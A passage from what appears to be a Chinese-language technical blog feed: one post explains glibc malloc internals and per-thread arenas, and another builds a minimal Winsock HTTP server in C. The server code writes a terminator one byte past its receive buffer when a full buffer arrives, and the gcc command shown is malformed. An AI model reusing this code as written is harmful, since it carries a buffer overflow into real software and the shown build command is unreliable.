size)</span>;</span><br></pre></td></tr></table></figure><p>malloc函式接受一個正整數參數size，代表我們希望分配的記憶體區塊大小（以位元組為單位）。它會嘗試找到一塊足夠大的連續記憶體區塊，並將其標記為已分配。如果成功找到一塊合適的記憶體區塊，malloc函式將返回指向該區塊開頭的指標；否則，它將返回NULL表示分配失敗。</p><p>雖然malloc函式看起來相對簡單，但其底層的實現是一個複雜的任務。不同的作業系統和編譯器可能使用不同的演算法和策略來執行記憶體分配。因此，我們將深入研究這些內部機制，以了解malloc函式是如何進行記憶體分配的，並探討其優缺點及效能影響。</p><p>接下來，我們將進入malloc函式的底層世界，一同揭開它背後的神秘面紗。我們將探討幾種常見的記憶體分配演算法，包括固定分割、動態分割以及頁面分割等等。這些演算法將幫助我們更好地理解malloc函式的工作方式，並瞭解如何優化記憶體使用效能。</p><p><img src="https://i.imgur.com/8lB2IrU.png"></p><p>隨著這個問題我們可以深入挖掘它的原理</p><h2 id="如何進行記憶體分配"><a href="#如何進行記憶體分配" class="headerlink" title="如何進行記憶體分配"></a>如何進行記憶體分配</h2><p>作業系統中的記憶體分配功能主要是靠記憶體分配器(Memory Allocator) 來實現，在早期glibc預設的記憶體分配器是 <code>dlmalloc</code></p><p>但<code>dlmalloc</code> 有個問題，一旦有多個Thread呼叫Malloc，只能有一個Thread可以進入Critical Section。而改進這個問題的就是從<code>dlmalloc</code>中fork出來的<code>ptmalloc2</code>，一旦多個Thread呼叫malloc，則會立即分配記憶體給個別Thread。</p><p>由於記憶體分配的任務基本上是會存在於多個Thread之間，因此<code>dlmalloc</code>很容易造成效能低落。在<code>ptmalloc2</code>中，多個Thread同時呼叫malloc時，記憶體會被立刻分配，因為每個Thread會維護單獨的堆疊區段，而維護每個堆疊區段的freelist 資料結構也同樣是個別獨立的。</p><p>這種維護個別freelist結構以及heap區段的行為叫做 <strong>per thread areana</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="type">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="type">char</span>* addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">pthread_t</span> t1;</span><br><span class="line">        <span class="type">void</span>* s;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,<span class="built_in">getpid</span>());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        ret = <span class="built_in">pthread_create</span>(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">pthread_join</span>(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>編譯並執行程式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c mythread -lpthread -o mythread</span><br><span class="line"></span><br><span class="line">./mythread</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/qeTHI16.png"></p><p>可以根據PID來查看行程的記憶體分配狀況<br>根據上面程式輸出提示其PID為74</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/PID/maps</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ScQz515.png"></p><p>可以觀察到Heap區段是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">55590b2c9000-55590b2ea000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fd7ddf25000-7fd7ddf28000 rw-p 00000000 00:00 0</span><br></pre></td></tr></table></figure><p>當呼叫malloc後，再次查看記憶體分配的情況</p><p><img src="https://i.imgur.com/yy06ND6.png"></p><p><img src="https://i.imgur.com/WpwRXFs.png"></p><p>我們可以發現free完後，所分配到的記憶體並不會馬上釋放，其實會先將記憶體區域釋放給<strong>glibc malloc library</strong>，這邊釋放的記憶體區塊(<strong>Chunk</strong>)會加入到main arenas bin (在glibc malloc中，freelist被稱為bin)，接著如果使用者請求分配新的記憶體區快，malloc就不會去kernel請求新的記憶體區快，而是去bin中找空的區塊(Free chunk)，若bin中沒有可用區塊才會再去跟kernel請求。</p><p><img src="https://i.imgur.com/ixhdaI2.png"></p><p><img src="https://i.imgur.com/43OePVQ.png"></p><div class="note info flat"><p>至於後續的文章會進一步去分析: 使用哪種System Call?</p><ul><li>mmap</li><li>brk</li></ul></div><p><img src="https://i.imgur.com/aLNmaSG.png"></p><h2 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h2><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a><br><a href="https://hanfeng.ink/post/understand_glibc_malloc/">https://hanfeng.ink/post/understand_glibc_malloc/</a><br><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p>]]></content>
      
      
      <categories>
          
          <category> Deep Dive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪透過 Winsock 依序堆疊出一個HTTP Server</title>
      <link href="/posts/34f1f1b8.html"/>
      <url>/posts/34f1f1b8.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/dcWHOfV.png"></p><p>主要想實做看看在Windows環境下透過Winsocks來建立網路層的Socket並且去進行應用層的協定解析，使用程式語言為C語言，平台則是使用VSCode，本次的學習方式是透過最近很火紅的 <a href="https://chat.openai.com/">ChatGPT</a> 來進行學習，並再自行Debug和研究語法。</p><h2 id="範例程式碼"><a href="#範例程式碼" class="headerlink" title="範例程式碼"></a>範例程式碼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 80 <span class="comment">// HTTP預設使用端口80</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BACKLOG 10 <span class="comment">// 等待連接佇列的最大長度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 4096 <span class="comment">// 接收緩衝區的大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 初始化WinSock庫</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 建立Socket</span></span><br><span class="line">    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (listenSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 綁定Socket到本地地址和端口</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">    serverAddress.sin_family = AF_INET;</span><br><span class="line">    serverAddress.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    serverAddress.sin_port = htons(PORT);</span><br><span class="line">    result = bind(listenSocket, (SOCKADDR*)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress));</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 監聽Socket</span></span><br><span class="line">    result = listen(listenSocket, BACKLOG);</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listen failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 阻塞等待客戶端的連接</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Waiting for client to connect...\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span></span><br><span class="line">    <span class="type">int</span> clientAddressLen = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">    SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&amp;clientAddress, &amp;clientAddressLen);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client connected.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 讀取客戶端發送的請求</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">int</span> recvLen = recv(clientSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (recvLen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(clientSocket);</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    buffer[recvLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Received request:\n%s&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析HTTP請求</span></span><br><span class="line">    <span class="type">char</span> method[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> url[<span class="number">256</span>];</span><br><span class="line">    <span class="type">char</span> version[<span class="number">16</span>];</span><br><span class="line">    sscanf_s(buffer, <span class="string">&quot;%s %s %s&quot;</span>, method, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(method), url, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(url), version, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parsed request: method=%s, url=%s, version=%s\n&quot;</span>, method, url, version);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 構造HTTP回應</span></span><br><span class="line">    <span class="type">char</span> response[BUFFER_SIZE];</span><br><span class="line">    sprintf_s(response, BUFFER_SIZE, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!&quot;</span>);</span><br><span class="line">    <span class="type">int</span> responseLen = (<span class="type">int</span>)<span class="built_in">strlen</span>(response);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 發送HTTP回應</span></span><br><span class="line">    result = send(clientSocket, response, responseLen, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(clientSocket);</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sent response:\n%s&quot;</span>, response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 關閉Socket</span></span><br><span class="line">    closesocket(clientSocket);</span><br><span class="line">    closesocket(listenSocket);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="程式主要流程"><a href="#程式主要流程" class="headerlink" title="程式主要流程"></a>程式主要流程</h2><ol><li>初始化 WinSock 函式庫</li><li>監聽Socket等待client端連接</li><li>接收client請求並解析其Method、URL以及協定版本</li><li>建構HTTP Response，發送給client端</li><li>關閉socket並清理Winsock資源</li></ol><h2 id="程式解釋"><a href="#程式解釋" class="headerlink" title="程式解釋"></a>程式解釋</h2><ul><li>首先一定要引入 &lt;winsock2.h&gt; 標頭檔</li><li>接著載入WinSock DLL  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>建立socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立Socket</span></span><br><span class="line">SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (listenSocket == INVALID_SOCKET) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>綁定socket到本地位址與port  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 綁定Socket到本地地址和端口</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">serverAddress.sin_family = AF_INET;</span><br><span class="line">serverAddress.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">serverAddress.sin_port = htons(PORT);</span><br><span class="line">result = bind(listenSocket, (SOCKADDR*)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress));</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>監聽Socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">result = listen(listenSocket, BACKLOG);</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>等待客戶端連接  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Waiting for client to connect...\n&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span></span><br><span class="line"><span class="type">int</span> clientAddressLen = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&amp;clientAddress, &amp;clientAddressLen);</span><br><span class="line"><span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">  <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client connected.\n&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>讀取客戶端請求  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="type">int</span> recvLen = recv(clientSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvLen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line">buffer[recvLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Received request:\n%s&quot;</span>, buffer);</span><br></pre></td></tr></table></figure></li><li>解析HTTP請求  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> method[<span class="number">16</span>];</span><br><span class="line"><span class="type">char</span> url[<span class="number">256</span>];</span><br><span class="line"><span class="type">char</span> version[<span class="number">16</span>];</span><br><span class="line">sscanf_s(buffer, <span class="string">&quot;%s %s %s&quot;</span>, method, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(method), url, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(url), version, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(version));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Parsed request: method=%s, url=%s, version=%s\n&quot;</span>, method, url, version);</span><br></pre></td></tr></table></figure></li><li>建構HTTP回覆  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> response[BUFFER_SIZE];</span><br><span class="line">sprintf_s(response, BUFFER_SIZE, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!&quot;</span>);</span><br><span class="line"><span class="type">int</span> responseLen = (<span class="type">int</span>)<span class="built_in">strlen</span>(response);</span><br></pre></td></tr></table></figure></li><li>發送HTTP回覆  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">result = send(clientSocket, response, responseLen, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Sent response:\n%s&quot;</span>, response);</span><br></pre></td></tr></table></figure></li><li>關閉socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">closesocket(clientSocket);</span><br><span class="line">closesocket(listenSocket);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure></li></ul><h2 id="程式執行結果"><a href="#程式執行結果" class="headerlink" title="程式執行結果"></a>程式執行結果</h2><ul><li>啟動HTTP Server<br><img src="https://i.imgur.com/J1qd5dQ.png"></li><li>存取 <a href="http://localhost/">http://localhost/</a><br><img src="https://i.imgur.com/wowoin8.png"></li><li>終端顯示結果<br><img src="https://i.imgur.com/ViLckvN.png"></li></ul><h2 id="Winsock2-h-中的函式用法及意義"><a href="#Winsock2-h-中的函式用法及意義" class="headerlink" title="Winsock2.h 中的函式用法及意義"></a>Winsock2.h 中的函式用法及意義</h2><ul><li><strong>WSAStartup</strong><ul><li>用於初始化 Winsock 函式庫，接收資料型別為<strong>WORD</strong>的版本參數以及資料型別為<strong>WSADATA</strong>的struct pointer</li><li>會回傳整數，函式呼叫成功則回傳0，否則回傳error code</li></ul></li><li><strong>socket</strong><ul><li>用於建立新的socket，接收三個參數: 協定家族、socket種類以及協定類型</li><li><pre><code class="c=">SOCKET WSAAPI socket(    [in] int af,    [in] int type,    [in] int protocol);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    - 他會回傳一個 **SOCKET**</span><br><span class="line">- **bind**</span><br><span class="line">    - 綁定Socket到本地地址和port，接收三個參數:socket 描述子、位址以及位址長度</span><br><span class="line">    - ```c=</span><br><span class="line">      int WSAAPI bind(</span><br><span class="line">       [in] SOCKET         s,</span><br><span class="line">       [in] const sockaddr *name,</span><br><span class="line">       [in] int            namelen</span><br><span class="line">      );</span><br></pre></td></tr></table></figure></code></pre></li><li>回傳整數</li></ul></li><li><strong>listen</strong><ul><li>用於監聽socket，等待客戶端連接，它接收兩個參數：socket描述子以及和等待連接佇列的最大長度</li><li><pre><code class="c=">int WSAAPI listen(    [in] SOCKET s,    [in] int    backlog  );<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     - 回傳整數</span><br><span class="line">- **accept**</span><br><span class="line">    - 接受客戶端的連接，並回傳一個新的Socket描述子</span><br><span class="line">    - 接收兩個參數: Socket描述子和客戶端地址的pointer</span><br><span class="line">    - ```c=</span><br><span class="line">      SOCKET WSAAPI accept(</span><br><span class="line">         [in]      SOCKET   s,</span><br><span class="line">         [out]     sockaddr *addr,</span><br><span class="line">         [in, out] int      *addrlen</span><br><span class="line">      );</span><br></pre></td></tr></table></figure></code></pre></li><li>會回傳一個 <strong>SOCKET</strong> 